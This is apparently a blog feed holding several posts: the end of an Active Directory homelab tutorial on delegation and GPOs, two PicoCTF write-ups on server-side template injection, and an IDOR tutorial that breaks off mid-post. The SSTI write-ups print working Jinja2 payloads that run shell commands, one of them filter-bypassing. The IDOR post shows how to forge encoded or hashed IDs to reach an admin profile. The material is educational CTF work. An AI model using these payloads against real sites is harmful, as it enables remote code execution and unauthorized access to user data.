<p>4.  <strong>Set a temporary password</strong></p>

<p>5.  Check the box <strong>“User must change password at next logon”</strong></p>

<p>6.  Click <strong>Next</strong>, then <strong>Finish</strong></p>

<p><img src="https://miro.medium.com/v2/resize:fit:429/1*3I5PhpeZFgEn6a1r6Dp-zg.png" alt="" /></p>

<p>Done.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:569/1*cKSu_RlYUTTBlF-4dWW1qQ.png" alt="" /></p>

<h3 id="️-what-is-delegation-in-ad">🏷️ What is Delegation in AD?</h3>

<p>Delegation in Active Directory is basically letting someone else do admin stuff <em>without</em> giving them full-blown god-mode access.</p>

<p>Think of it like this: You’re the sysadmin, and you don’t want to be bothered every time someone needs a password reset or a new user added. So you <strong>delegate</strong> those tasks to another user or group like your IT helpdesk team but only those specific permissions, not full admin rights.</p>

<p>🧑‍⚕️ Let’s give Sarah permission to reset passwords for doctors
Alright, so Sarah’s in IT, and we want her to help out when doctors forget their passwords (which happens a lot, let’s be real).</p>

<p>Instead of giving her full admin rights, we’ll delegate control to her so she can only reset passwords for users in the Doctors OU.</p>

<p>1)   <strong>Right-click on the Doctors OU</strong> → choose <strong>“Delegate Control…“</strong></p>

<p><img src="https://miro.medium.com/v2/resize:fit:361/1*TgaTcdTNPKyKZzB5ztepow.png" alt="" /></p>

<p>2)     The <strong>Delegation of Control Wizard</strong> will pop up.
Click <strong>Next</strong>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:486/1*ZQI_NDSk7s0T06avMD7Q2Q.png" alt="" /></p>

<p>3) To avoid mistyping the user’s name, write “phillip” and click the <strong>Check Names</strong> button. Windows will autocomplete the user for you.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:490/1*BcuOBhHFH29k4d1JOd7JVQ.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:487/1*r5ZU_tl8S6WnStEtbgR63w.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:491/1*5irizhzT4mPVC2NjsgKzIQ.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:488/1*ozHjOA-61FcKtLofALExwA.png" alt="" /></p>

<p>4) Select <strong>“Reset user passwords and force password change at next logon”</strong>
This gives her the ability to help if any doctor forgets their login.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:489/1*KYdiU2Spv7GTbyZ9X0z5mQ.png" alt="" /></p>

<p>5) Click <strong>Next</strong>, then <strong>Finish</strong></p>

<p><img src="https://miro.medium.com/v2/resize:fit:489/1*okhIf3NiCGsMPe3_oLYkWw.png" alt="" /></p>

<p>Now let’s log in as user s.patel and test their privileges.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*nLt1QK_hxZ_WYRGY851x_w.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*63zMWyq9Fbpa54jnMQ7tUA.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*mZzxRdfeT5LhxgfH8F4NWA.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:546/1*AINPq98u3v9Jj8ZsrgnmIA.png" alt="" /></p>

<p>Now we’re gonna use PowerShell to handle this:</p>

<h3 id="-scenario">🩺 Scenario:</h3>

<p>Let’s say we have a user in the <strong>Doctors OU</strong> named <strong>Doctor John</strong>, with the username <code class="language-plaintext highlighter-rouge">d.joe</code>. He forgot his password and reached out to IT for help.</p>

<p>Since we already <strong>delegated password reset permissions</strong> on the <strong>Doctors OU</strong> to <strong>Sarah</strong> (who’s part of the IT team in the IT OU), she can now reset John’s password <strong>without needing full domain admin rights</strong>.</p>

<p>From <strong>Sarah’s account</strong>, we can run this PowerShell command to reset <code class="language-plaintext highlighter-rouge">d.joe</code>’s password:</p>

<p>powershell</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">PS C:\Users\tobiasare&gt;</span> Set-ADAccountPassword d.joe -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*RpC6t-R4wRxr5TW5nE_SNg.png" alt="" /></p>

<hr />

<p>Now that we’ve reset his password, we <strong>don’t want John to keep using the one we just set</strong> (since Sarah knows it). So we’ll force him to change it at next login with this command:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">PS C:\Users\tobiasare&gt;</span> Set-ADUser -ChangePasswordAtLogon $true -Identity d.joe -Verbose
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*whU13oaR5IbdDYS5ozF_iQ.png" alt="" /></p>

<h3 id="-final-step">🔐 Final Step:</h3>

<p>John can now log in with the new temporary password. As soon as he logs in, Windows will <strong>prompt him to set a new one</strong> something only he knows.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:665/1*exWBZY2xueEwEKdNEX1-mw.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:553/1*RAHSVZ5LMv-zuhiXbAZQWw.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:560/1*xS3LUbxTcwrrQ3s6dnwSnA.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:518/1*KkPo1AltsOLOe20MgSinrw.png" alt="" /></p>

<h3 id="️-1-workstations">🖥️ 1. Workstations</h3>

<p>These are the desktops or laptops your users log into every day. They’re your frontline devices the ones people use to write papers, check emails, Slack off (we know), or get actual work done.</p>

<p>🔐 <strong>Pro tip:</strong>
Never (like, ever) log in to these with privileged or admin accounts. If one gets compromised (phishing, malware, you name it), and it’s tied to a high-privilege account? Boom. That’s how entire networks get pwned.</p>

<p>👉 <strong>Think of it like this:</strong>
Workstations are the student laptops in a university lab. They’re everywhere, and everyone touches them. Keep them locked down.</p>

<hr />

<h3 id="️-2-servers">🗄️ 2. Servers</h3>

<p>These bad boys are the backbone of your network. They’re not for browsing Reddit or playing Valorant they exist to <em>serve</em> (literally). Whether it’s hosting websites, databases, or internal apps, they handle the heavy lifting.</p>

<p>🔁 <strong>They usually interact with other servers or respond to users</strong>, but they shouldn’t be used like workstations. Treat ‘em like dedicated, no-nonsense machines that stay clean and focused.</p>

<p>👉 <strong>Example:</strong>
A web server hosting your school’s blog site or a file server storing your class materials.</p>

<hr />

<h3 id="-3-domain-controllers-dcs">🧠 3. Domain Controllers (DCs)</h3>

<p>Okay, now we’re at the <strong>top-tier, god-mode</strong>  devices in AD: Domain Controllers. These are the ones running the show managing users, devices, logins, policies, and more.</p>

<p>⚠️ <strong>These are super sensitive</strong>. Why? Because they store <strong>hashed passwords for everyone</strong>  in the domain. If an attacker gains access to a DC, it’s basically game over.</p>

<p>💡 <strong>Best practice:</strong>
Lock these down harder than your finals study notes. Limited access, serious logging, no unnecessary software. Only admins should touch these and only for legit reasons.</p>

<h3 id="️-group-policies-101-why-ous-actually-matter">🛡️ Group Policies 101: Why OUs Actually Matter</h3>

<p>So, you’ve split your users and computers into <strong>Organizational Units (OUs)</strong> cool. But if you’re thinking <em>“this is just for show,”</em>  nah. There’s <strong>real power</strong>  behind that setup.</p>

<p>The real reason we organize things into OUs is to unlock <strong>custom control</strong>  with something called <strong>Group Policy Objects (GPOs)</strong>.</p>

<hr />

<h3 id="️-whats-a-gpo">🎛️ What’s a GPO?</h3>

<p><strong>GPO = Group Policy Object</strong>
It’s basically a bundle of rules and settings you can apply to users or computers inside an OU. Think of it like this:</p>

<blockquote> "Hey, Marketing team? You get this wallpaper, these password settings, and you can't install random apps. But IT? You get admin tools, different lock screen timeouts, and no drive restrictions."</blockquote>

<p>Boom. That’s the vibe of GPOs.</p>

<hr />

<h3 id="-users-vs-computers">🧩 Users vs. Computers</h3>

<p>GPOs can target either:</p>

<ul>
  <li>
    <p>👤 <strong>Users</strong> Think logon restrictions, desktop settings, password rules, etc.</p>
  </li>
  <li>
    <p>💻 <strong>Computers</strong> Think firewall rules, software installations, update settings, etc.</p>
  </li>
</ul>

<p>The cool part? One GPO can contain policies for both, or you can split them up depending on how granular you wanna get.</p>

<h3 id="-example-real-gpos-on-your-machine">🧠 Example: Real GPOs on Your Machine</h3>

<p>If you crack open <code class="language-plaintext highlighter-rouge">gpmc.msc</code>, you’ll probably already see some preloaded GPOs like:</p>

<ul>
  <li>
    <p><strong>Default Domain Policy</strong> baseline stuff applied to everyone.</p>
  </li>
  <li>
    <p><strong>Default Domain Controllers Policy</strong> applied specifically to DCs.</p>
  </li>
</ul>

<p>These are <strong>global policies</strong>, but the real fun starts when you build your own.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*E_I0IVbP6imemcnISdTCUw.png" alt="" /></p>

<h3 id="-why-its-dope">✨ Why It’s Dope</h3>

<p>This setup lets you:</p>

<ul>
  <li>
    <p>Push security configs to different departments</p>
  </li>
  <li>
    <p>Lock down public machines without restricting devs</p>
  </li>
  <li>
    <p>Control USB access, RDP, or software installs per team</p>
  </li>
  <li>
    <p>Make your AD environment <strong>scalable and secure</strong></p>
  </li>
</ul>

<hr />

<h3 id="-inheritance-gpos-flow-downstream">🧬 Inheritance: GPOs Flow Downstream</h3>

<p>Here’s something a lot of beginners miss, but it’s <strong>super important</strong>:</p>

<blockquote>📢 Any GPO linked to an OU will also apply to its sub-OUs.</blockquote>

<p>Let’s break that down real quick.</p>

<p>Imagine you’ve got this structure:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
Domain.com

└── Staff

    └── Doctors
</code></pre>
</div>

<p>If you apply a GPO to <code class="language-plaintext highlighter-rouge">Staff</code>, guess what? It <strong>automatically</strong>  affects <code class="language-plaintext highlighter-rouge">Doctors</code>  too. That’s called <strong>inheritance</strong>, and it can be a blessing… or a headache, if you’re not paying attention.</p>

<p>So yeah, even though you might only link the <strong>Default Domain Policy</strong>  at the top level, it’ll still reach <strong>everyone below it</strong>, unless you tell it not to.</p>

<h3 id="-want-to-stop-that">🔒 Want to Stop That?</h3>

<p>You’ve got two main options if inheritance is messing with your plans:</p>

<ol>
  <li>
    <p><strong>Block Inheritance</strong> (on the sub-OU)
This tells the OU: <em>“Yo, I’m independent. No upstream GPOs for me.”</em>
Use it sparingly though it can make things messy to troubleshoot.</p>
  </li>
  <li>
    <p><strong>Enforce</strong> (on the GPO itself)
This overrides any Block Inheritance. Basically says: <em>“No matter what, I run this.”</em>  Use this for high-priority GPOs like security baselines.</p>
  </li>
</ol>

<p>Let’s take a closer look at the <strong>Default Domain Policy</strong>  to understand what a GPO actually contains.</p>

<p>When you click on a GPO, the first tab you’ll land on is called <strong>Scope</strong>. This tab shows you <strong>where</strong>  in Active Directory the GPO is linked. In the case of the Default Domain Policy, you’ll see it’s linked to the entire <code class="language-plaintext highlighter-rouge">homelab.local</code>  domain.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*xkq79Zmg7FQlHrQdMBs55w.png" alt="" /></p>

<hr />

<p>Now, check out the <strong>Security Filtering</strong>  section. This controls <strong>who the GPO actually applies to</strong>  within that linked location. By default, it’s set to <strong>Authenticated Users</strong>, which means <strong>every user and computer</strong>  that’s logged into the domain.</p>

<p>But here’s the trick: you can customize this filtering. If you only want the GPO to affect certain users or machines even if they’re in the same OU you can change the Security Filtering to target a specific group or object.</p>

<p>So even though a GPO is linked to a whole domain or OU, Security Filtering gives you finer control over <strong>who really gets hit</strong>  by the policy.</p>

<p>When you open the <strong>Settings</strong>  tab on a GPO, you’ll see the <strong>specific configurations</strong>  it applies. Remember, GPOs can have settings that target either <strong>computers</strong>  or <strong>users</strong>. In the case of the <strong>Default Domain Policy</strong>, it only contains <strong>Computer Configuration</strong>  settings.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*oF1QxGuauIFPl38T_mM_Pw.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*mCjphcpqdEivnkf9hk-Q4g.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*3f0MvYq1cnIN0buiDlphPQ.png" alt="" /></p>

<p>These are super basic, foundational settings that most domains should have. Things like <strong>password policies</strong>  and <strong>account lockout rules</strong>. Since this GPO is linked to the entire domain, any changes made here will apply to <strong>all computers</strong>  in the domain.</p>

<p>Let’s say we want to change the <strong>minimum password age</strong>  to <strong>31 days</strong>. Here’s how you’d do it:</p>

<ol>
  <li>Right-click the <strong>Default Domain Policy</strong>  and hit <strong>Edit</strong>.</li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:446/1*b3bCUeow_Ol_OmQqAyo2FQ.png" alt="" /></p>

<ol>
  <li>
    <p>A new window pops up with all the settings.</p>
  </li>
  <li>
    <p>Navigate to:
<code class="language-plaintext highlighter-rouge">Computer Configuration -&amp;gt; Policies -&amp;gt; Windows Settings -&amp;gt; Security Settings -&amp;gt; Account Policies -&amp;gt; Password Policy</code></p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*nKOUoC2Z9eoafZ9Jh6Gyeg.png" alt="" /></p>

<ol>
  <li>Find <strong>Minimum password age</strong>  and set it to <strong>31 days</strong>.</li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:409/1*XXo8oyNNkXSkWPll8QJgmQ.png" alt="" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:629/1*Q6OgJ0MOywXt94DR9euiQQ.png" alt="" /></p>

<p>Some of the settings are pretty self-explanatory. But if you’re unsure what something does, just <strong>double-click it</strong>  and go to the <strong>Explain</strong>  tab. It breaks down what the setting does and how it affects the system.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:408/1*-f4A6SKvl50JXlTaezoT1Q.png" alt="" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SSTI1 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html" rel="alternate" type="text/html" title="SSTI1 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_an_image_of_a_computer_hacker_in_the_style_of_pixelated_c429d5b3-77c4-4c70-9076-a2c3e7ff6f3a.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h2 id="description">Description</h2>

<blockquote>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!</blockquote>

<p><img src="https://miro.medium.com/v2/resize:fit:613/1*749ohjzhVKocSttt49oQWQ.png" alt="" /></p>

<p>If we type picoCTF, it would show this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*We7v-m3zd-UQpEYLKxGCFA.png" alt="" /></p>

<p>Let’s try some template injection, in this case we are going to use this <code class="language-plaintext highlighter-rouge">{{7*7}}</code>:</p>

<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection?source=post_page-----0853498698d5---------------------------------------">PayloadsAllTheThings/Server Side Template Injection</a></p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*p6nuwKmCpJDW8EQ2qJtakA.png" alt="" /></p>

<p>This time, we got <code class="language-plaintext highlighter-rouge">49</code> because <code class="language-plaintext highlighter-rouge">7 × 7 = 49</code>. That means our injection works. Now, let’s try some more advanced injections.</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*nIEgY-qk-0gDP50LEfcLdQ.png" alt="" /></p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -lah').read() }}</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*ppTGzKKyJ-A80GgxnjNRNg.png" alt="" /></p>

<p>Now we can read the flag.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SSTI2 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2.html" rel="alternate" type="text/html" title="SSTI2 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_an_image_of_a_computer_hacker_in_the_style_of_pixelated_3252a918-2d74-4cbf-9ab0-a5aad868295a.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h2 id="description">Description</h2>

<blockquote>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)</blockquote>

<p>This is going to be challenging, but we’ve got this because, based on the description…</p>

<p><img src="https://miro.medium.com/v2/resize:fit:700/0*pH3T71KSqmj2LUip" alt="" /></p>

<p>Using this image, we can test the site to see which templates we are working on.</p>

<p>from <code class="language-plaintext highlighter-rouge">${7*7}</code> didn’t work, <code class="language-plaintext highlighter-rouge">{{7*7}}</code> works → <code class="language-plaintext highlighter-rouge">{{7*'7'}}</code> works → <code class="language-plaintext highlighter-rouge">jinja2</code> or <code class="language-plaintext highlighter-rouge">twig</code></p>

<p>Based on this post, we have different payloads to be able to bypass this with <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">Jinja2</a></p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="language-powershell">
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('whoami')|attr('read')()}}</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*dPHJA_Rrnb9ORHvdFGlKbg.png" alt="" /></p>

<p>we’re in!!</p>

<p>Thanks for reading</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Breaking Boundaries with IDOR</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/idor.html" rel="alternate" type="text/html" title="Breaking Boundaries with IDOR" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/idor</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/idor.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/c92ebe07-2ac3-4dce-8168-b418e20c1579.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h3 id="hey-folks">Hey folks!</h3>
<p>If you’re just dipping your toes into web security or bug bounties, <strong>IDOR</strong> is one of those bugs you <em>definitely</em> wanna keep an eye out for. It’s simple, it’s sneaky, and best of all it <em>pops up everywhere</em>. Let’s break it down like we’re chilling in a dorm room, whiteboarding bug bounty tactics over some cold coffee.</p>

<hr />

<h2 id="what-is-idor">What is IDOR?</h2>

<h4 id="idor-stands-for-insecure-direct-object-reference"><strong>IDOR</strong> stands for <strong>Insecure Direct Object Reference</strong>.</h4>

<p>In plain English, it’s when a web app exposes a way for users to <strong>access data they shouldn’t</strong> just by tweaking something like a URL parameter, form data, or an API request.</p>

<blockquote>
  <p>Basically: the app “trusts” the user a little too much.</p>
</blockquote>

<h4 id="now-what-about-encoded-ids">Now, what about <strong>Encoded IDs?</strong></h4>

<p>People often try to “hide” or “protect” those IDs by encoding them. Common ways:</p>

<ul>
  <li>
    <p><strong>Base64 encoding</strong> (very common, super easy to decode)</p>
  </li>
  <li>
    <p>Custom <strong>hashing</strong> or <strong>encryption</strong></p>
  </li>
  <li>
    <p>Obfuscation schemes like <strong>Hashids</strong></p>
  </li>
</ul>

<p>But guess what? Just encoding an ID is <strong>NOT</strong> the same as properly securing access. If the app doesn’t verify authorization, IDOR still happens, no matter how “fancy” the ID looks.</p>

<h1 id="example-vulnerable-encodedid-app">Example: Vulnerable EncodedID App</h1>

<p>When we log in, our profile ID is <strong>30</strong>.</p>

<p>On the profile page, we see basic info like:</p>

<ul>
  <li>
    <p><strong>Username</strong></p>
  </li>
  <li>
    <p><strong>Email</strong></p>
  </li>
</ul>

<p>If you check the URL, it looks something like this:
<code class="language-plaintext highlighter-rouge">/profile/&lt;encoded_id&gt;</code></p>

<p>That <code class="language-plaintext highlighter-rouge">&lt;encoded_id&gt;</code> is actually a Base64-encoded JSON string. For example:</p>

<p><code class="language-plaintext highlighter-rouge">eyJpZCI6IDMwfQ==</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TMbxIOwPJIeV02t8UMa1Jg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we decode it from Base64, it reveals:</p>

<p><code class="language-plaintext highlighter-rouge">{"id": 30}</code></p>

<p>Now here’s the catch admin usually has an ID of <strong>1</strong>:</p>

<p><code class="language-plaintext highlighter-rouge">{"id": 1}</code></p>

<p>If we encode that, it becomes:</p>

<p><code class="language-plaintext highlighter-rouge">eyJpZCI6IDF9</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OtliS8PnLjrY4ugW7mNPbw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>By swapping out the encoded ID in the URL with this admin one, we can <strong>gain access to the admin’s profile and email</strong>.</p>

<hr />

<h4 id="why-is-this-bad">Why is this bad?</h4>

<p>Because the app blindly trusts the client-provided encoded ID, anyone can tamper with it and impersonate other users no authentication needed. Classic insecure access control.</p>

<h1 id="whats-the-deal-with-hashed-ids-and-idor">What’s the deal with Hashed IDs and IDOR?</h1>

<p>Apps try to level up their game by <strong>hashing IDs</strong> instead of sending raw, sequential IDs in URLs or API requests. The idea? Make it harder for attackers to guess or manipulate those IDs and access unauthorized data.</p>

<p>But here’s the catch <strong>hashing alone ain’t security.</strong> If the backend doesn’t check user permissions or if the hashing method is weak or reversible, IDOR still slaps hard.</p>

<h4 id="why-hashed-ids-can-still-be-broken-and-abused">Why hashed IDs can still be broken and abused:</h4>

<ol>
  <li>
    <p><strong>Deterministic Hashing:</strong>
Most hashes (MD5, SHA1, SHA256) are deterministic. Same input = same output. If you know or guess the input space (like user IDs from 1 to 10,000), you can generate a full rainbow table or brute force hashes offline.</p>
  </li>
  <li>
    <p><strong>No Salting or Secret Keys:</strong>
If the hash is just <code class="language-plaintext highlighter-rouge">hash(ID)</code> with no salt or secret, it’s an open invitation for brute force. Attackers can precompute hashes and reverse map.</p>
  </li>
  <li>
    <p><strong>Lack of Backend Authorization:</strong>
Even if the hash is strong, if the server just decodes the hash and fetches the object without verifying <em>who</em> owns it or if the requester has rights, boom IDOR.</p>
  </li>
  <li>
    <p><strong>Weak Hash Algorithms:</strong>
MD5 and SHA1 are outdated and cracked. Using these for hashing IDs is like locking your door with a plastic key.</p>
  </li>
</ol>

<h4 id="breaking-down-an-idor-vulnerability-using-md5-hashes">Breaking Down an IDOR Vulnerability Using MD5 Hashes</h4>

<p>In this scenario, we’ve got an <strong>IDOR (Insecure Direct Object Reference)</strong> vulnerability that’s relying on an MD5 hash as an identifier.</p>

<p>Here’s the URL pattern we’re looking at:</p>

<p><code class="language-plaintext highlighter-rouge">/profile/202cb962ac59075b964b07152d234b70</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WTgH86wT2tPv5hUUFWjFww.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>This is an MD5 hash. If we crack it using something like <a href="https://crackstation.net">CrackStation</a>, it reveals the original value:</p>

<p><code class="language-plaintext highlighter-rouge">123</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*A1vbrri-0wHjjsI5nAeQZg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now, if we generate the MD5 hash for the value <code class="language-plaintext highlighter-rouge">1</code>, we get:</p>

<p><code class="language-plaintext highlighter-rouge">c4ca4238a0b923820dcc509a6f75849b</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*L57KCP_43Pd6AD_ZErczbA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we substitute that hash into the URL:</p>

<p><code class="language-plaintext highlighter-rouge">/profile/c4ca4238a0b923820dcc509a6f75849b</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DP_ulUgtDrvnPRztn4x6kw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>we gain access to an admin profile!</p>

<h2 id="cracking-idor-with-unpredictable-ids-a-tale-of-two-accounts">Cracking IDOR with Unpredictable IDs A Tale of Two Accounts</h2>

<p>So picture this: I’m chilling in my dorm, knocking out some bug bounty recon between classes and ramen breaks. I’m poking around this web app nothing too crazy when I notice that the resource URLs use these <em>wild</em>, unpredictable ID strings. I’m talking UUIDs like <code class="language-plaintext highlighter-rouge">95a1c0f4-d3ff-11ed-afa1-0242ac120002</code> instead of classic <code class="language-plaintext highlighter-rouge">?id=123</code>.</p>

